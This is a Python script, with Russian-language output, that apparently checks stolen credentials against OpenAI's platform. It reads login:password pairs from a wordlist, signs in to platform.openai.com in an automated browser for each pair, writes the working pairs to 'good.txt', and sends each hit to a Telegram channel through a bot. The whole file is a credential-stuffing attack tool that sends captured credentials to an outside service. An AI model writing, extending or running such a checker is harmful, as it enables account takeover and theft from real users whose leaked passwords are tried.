import time
from datetime import datetime
from color import red, yellow, blue, magenta, green
from chrome_driver import OpenAICore
from tg import TgUnit

current_datetime = datetime.now()
formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")


def OpenAI_auth(login, passw):
    auth_link = 'https://platform.openai.com/login?launch'
    openai_core = OpenAICore(auth_link)

    try:
        openai_core.start_browser()
        openai_core.open_open_ai()
        openai_core.auth_mail(login)
        openai_core.auth_pass(passw)
        time.sleep(2)
        if openai_core.check_auth():
            print(red('Ошибка ввода пароля или email'))
        else:
            time.sleep(2)
            if openai_core.get_cookie_auth() == 'true':
                print(green(f'Вы авторизованы как {login}!'))
                return openai_core.get_cookie_auth()
            else:
                print(red('Ошибка ввода пароля или email'))

    except Exception as ex:
        print(f'Произошла ошибка: {ex}')
        with open('unchecked.txt', 'a+', encoding='utf-8') as ff:
            ff.write(f'{login}:{passw}\n')

    finally:
        openai_core.close_browser()


def list_credentials():
    with open('slovar.txt', 'r+', encoding='utf-8') as file:
        src = file.read()
    list_cred = src.split('\n')
    return list_cred


def main():
    base = list_credentials()
    tg_notify = TgUnit('BOT_TOKEN', 'YourChannelID')
    count = 0
    count_good = 0
    count_bad = 0

    for line in base:
        print(f'{yellow("========================================================================================")}'
              f'\n{yellow(f"Проверяю пару: {line} [{count + 1}/{len(base)}]")}')
        if OpenAI_auth(login=f'{line.split(":")[0]}', passw=f'{line.split(":")[1]}') == "true":
            count_good += 1
            count += 1
            with open('good.txt', 'a+', encoding='utf-8') as file:
                file.write(f'{line}\n')
            tg_notify.send_message(f'\nНовый аккаунт [N: {count} | A: {len(base)} | G: {count_good} | B: {count_bad}] \n\n'
                                   f'{line}')

        else:
            count_bad += 1
            count += 1
        print(f'\n{green(f"ХОРОШИХ: {count_good}")}\n'
              f'{red(f"ПЛОХИХ: {count_bad}")}\n'
              f'{magenta(f"ВСЕГО: {count}")}\n'
              f'')


if __name__ == '__main__':
    main()
